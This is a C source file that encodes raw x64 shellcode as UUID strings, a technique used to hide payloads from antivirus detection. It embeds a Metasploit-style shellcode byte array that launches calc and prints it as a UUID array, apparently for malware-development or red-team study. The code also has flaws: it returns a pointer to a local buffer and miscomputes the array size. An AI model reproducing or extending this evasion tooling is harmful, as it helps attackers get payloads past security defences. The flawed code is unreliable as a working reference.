#include <Windows.h>
#include <stdio.h>

#pragma warning(disable:4996)

// Function takes in 16 raw bytes and returns them in a UUID format

char* GenerateUUid(int a, int b, int c, int d, int e, int f, int g, int h, int i, int j, int k, int l, int m, int n, int o, int p) {

	// Each UUID segment is 32 bytes (bits?)
	char Output0[32], Output1[32], Output2[32], Output3[32];


	// UUID itself consisting of the 4 segments that I declared below
	char result[128];

	// First three segments use little-endian byte ordering and are thus in a reverse order.

	// Generate Output0 from the first 4 bytes
	sprintf(Output0, "%0.2X%0.2X%0.2X%0.2X", d, c, b, a);

	// Generate Output1 from the second 4 bytes
	sprintf(Output1, "%0.2X%0.2X-%0.2X%0.2X", f, e, h, g);
	sprintf(Output2, "%0.2X%0.2X-%0.2X%0.2X", i, j, k ,l);
	sprintf(Output3, "%0.2X%0.2X%0.2X%0.2X", m, n, o, p);

	// Combine all of the outputs above to generate the UUID
	sprintf(result, "%s-%s-%s%s", Output0, Output1, Output2, Output3);

	return (char*)result;
}


// This the function that generates the UUID output representation of the Shellcode
// Requires a pointer(or base address) to the buffer where the shellcode is stored and the size of that buffer

BOOL GenerateUuidOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {

	// If the Shellcode buffer is NULL or the size of the Shellcode buffer is NULL,
	// or if the Shellcode is not a multiple of 16, return FALSE and exit.
	if (pShellcode == NULL || ShellcodeSize == NULL || ShellcodeSize % 16 != 0) {
		return FALSE;
	}

	printf("char* UuidArray[%d] = { \n\t", (int)(ShellcodeSize % 16));

	// Read one shellcode byte at a time, when we have read 16 shellcode bytes, begin generating the UUID
	// 'c' is used to store the number of bytes read
	// We start at 16 bytes by default

	int c = 16, counter = 0; 
	char* UUID = NULL;

	for (int i = 0; i < ShellcodeSize; i++) {
		if (c == 16) {
			counter++;

			UUID = GenerateUUid(pShellcode[i], pShellcode[i + 1], pShellcode[i + 2], pShellcode[i + 3], pShellcode[i + 4], pShellcode[i + 5], pShellcode[i + 6],
				pShellcode[i + 7], pShellcode[i + 8], pShellcode[i + 9], pShellcode[i + 10], pShellcode[i + 11], pShellcode[i + 12],
				pShellcode[i + 13], pShellcode[i + 14], pShellcode[i + 15]);

			if (i == ShellcodeSize - 16) {

				// This prints out the last UUID string since the total bytes we have are i+15
				printf("\"%s\"", UUID);
			}
			else {
				printf("\"%s\"", UUID);
			}
			c = 1;

			// Beautify the output of the console
			if (counter % 3 == 0) {
				printf("\n\t");
			}

			c++;
		}
	}


	printf("\n}\n\t");
	return TRUE;
}

unsigned char rawData[] = {
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

// "E48348FC-E8F0-00C0-0000-415141505251" UUID format





unsigned char rawData2[] = {
	0xDE, 0x72, 0xC3, 0x4E, 0x08, 0xBD,
	0x34, 0x71, 0x9E, 0xB6, 0x52, 0x2B,
	0xFE, 0xD9, 0xA4, 0x37
}; 

// "4EC372DE-BD08-7134-9EB6-522BFED9A437" UUID format


int main(void) {

	printf("Press <Enter> to start the obfuscation proces...\n");
	getchar();

	if (!GenerateUuidOutput(rawData, sizeof(rawData))) {
		printf("[-] Could not generate a valid UUID...\n");
		return 1;
	}

	printf("Press <Enter> to Quit...\n");
	getchar();


	return 0;
}